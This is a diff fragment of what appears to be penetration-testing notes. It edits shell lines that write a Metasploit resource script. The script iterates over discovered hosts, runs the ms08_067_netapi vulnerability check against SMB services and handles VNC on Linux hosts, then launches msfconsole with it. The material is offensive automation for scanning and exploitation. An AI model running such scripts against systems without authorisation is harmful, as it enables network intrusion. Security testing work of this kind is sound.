@@ -252,8 +252,7 @@
 
       touch exploiter.rc
 
-        echo 'setg 192.168.1.71 192.168.1.254' > exploiter.rc
-        echo '' >> exploiter.rc
+        echo 'setg RHOSTS 192.168.1.71 192.168.1.254' > exploiter.rc
         echo '<ruby>' >> exploiter.rc
         echo 'framework.db.hosts.each do |h|' >> exploiter.rc
         echo '   h.services.each do |serv|' >> exploiter.rc
@@ -265,7 +264,6 @@
         echo '          print_good("Running ms08_067_netapi check against #{h.address}")' >> exploiter.rc
         echo '          run_single("set RHOST #{h.address}")' >> exploiter.rc
         echo '          run_single("check")' >> exploiter.rc
-        echo '' >> exploiter.rc
         echo '   elsif serv.port == 5900 and h.os_name =~/Linux/i' >> exploiter.rc
         echo '          next if (serv.port != 5900)' >> exploiter.rc
         echo '          print_good("#{h.address} seems to be Linux #{h.os_flavor}.")' >> exploiter.rc
@@ -280,6 +278,7 @@
         echo ' end' >> exploiter.rc
         echo 'end' >> exploiter.rc
         echo '</ruby>' >> exploiter.rc
+        echo 'unsetg RHOSTS' >> exploiter.rc
 
      `[run]` msfconsole -r /root/exploiter.rc
 
